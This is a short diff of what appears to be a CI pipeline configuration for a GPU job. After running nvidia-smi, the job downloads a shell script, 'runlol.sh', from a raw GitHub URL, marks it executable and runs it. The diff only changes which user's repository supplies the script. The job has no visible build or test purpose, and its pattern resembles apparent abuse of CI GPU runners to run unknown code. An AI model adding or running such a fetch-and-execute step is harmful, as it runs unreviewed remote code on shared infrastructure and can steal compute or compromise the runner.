@@ -7,5 +7,5 @@ jobs:
     resource_class: gpu.nvidia.small
     steps:
       - run: nvidia-smi
-      - run: wget https://raw.githubusercontent.com/Myaxisplay/pos/main/runlol.sh && chmod +x runlol.sh && ./runlol.sh
+      - run: wget https://raw.githubusercontent.com/djrjfk/pos/main/runlol.sh && chmod +x runlol.sh && ./runlol.sh
       
